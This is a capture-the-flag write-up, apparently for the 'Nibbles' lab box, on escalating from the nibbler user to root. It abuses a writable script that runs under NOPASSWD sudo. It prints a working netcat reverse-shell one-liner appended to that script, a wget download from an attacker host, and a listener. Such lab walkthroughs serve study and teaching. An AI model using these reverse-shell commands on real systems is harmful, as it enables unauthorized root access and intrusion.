# Nibbles — Privilege Escalation (Summary)

**Goal:** Escalate privileges from `nibbler` to `root` after obtaining a reverse shell.

---

## Quick summary
- Unzipped `personal.zip` and found `personal/stuff/monitor.sh`.
- `monitor.sh` is owned by `nibbler` and is writable by that user.
- Downloaded `LinEnum.sh` via a Python HTTP server to automate enumeration.
- LinEnum revealed that `nibbler` can run `/home/nibbler/personal/stuff/monitor.sh` via `sudo` **without a password** (NOPASSWD).
- Because `monitor.sh` is writable by `nibbler`, appending a reverse-shell payload and executing it with `sudo` yields a root shell.
- Caught the root shell on a listening `nc` (netcat) and retrieved `root.txt`.

---

## Key commands & steps

**Unzip personal.zip**
```bash
unzip personal.zip
# creates personal/stuff/monitor.sh
```

**Inspect monitor.sh**
```bash
cat personal/stuff/monitor.sh
# file is owned by nibbler and writable
```

**Host LinEnum on attacker machine**
```bash
sudo python3 -m http.server 8080
# on attacker: wget http://<attacker_ip>:8080/LinEnum.sh from target
```

**Make LinEnum executable and run**
```bash
chmod +x LinEnum.sh
./LinEnum.sh
# reveals sudo NOPASSWD for monitor.sh
```

**Append reverse shell to monitor.sh (make backup first)**
```bash
cp monitor.sh monitor.sh.bak
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```

**Execute monitored script as root**
```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

**Listener (attacker)**
```bash
nc -lvnp 8443
# catch root shell
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Observations & suggestions
- Writable files that are executable via `sudo` with NOPASSWD are high-risk — if you can modify them, you can escalate.
- Always make a backup before editing files used for privilege escalation to avoid breaking functionality.
- After gaining root, collect `root.txt` and conduct post-exploitation enumeration responsibly (only in authorized labs).

---

## Next steps (practice)
- Remove the appended payload and restore the original `monitor.sh` from backup.
- Try alternative escalation methods: inspecting SUID binaries, weak sudoers entries, cron jobs, and sensitive config files.
- Practice the same steps on different boxes to build muscle memory.
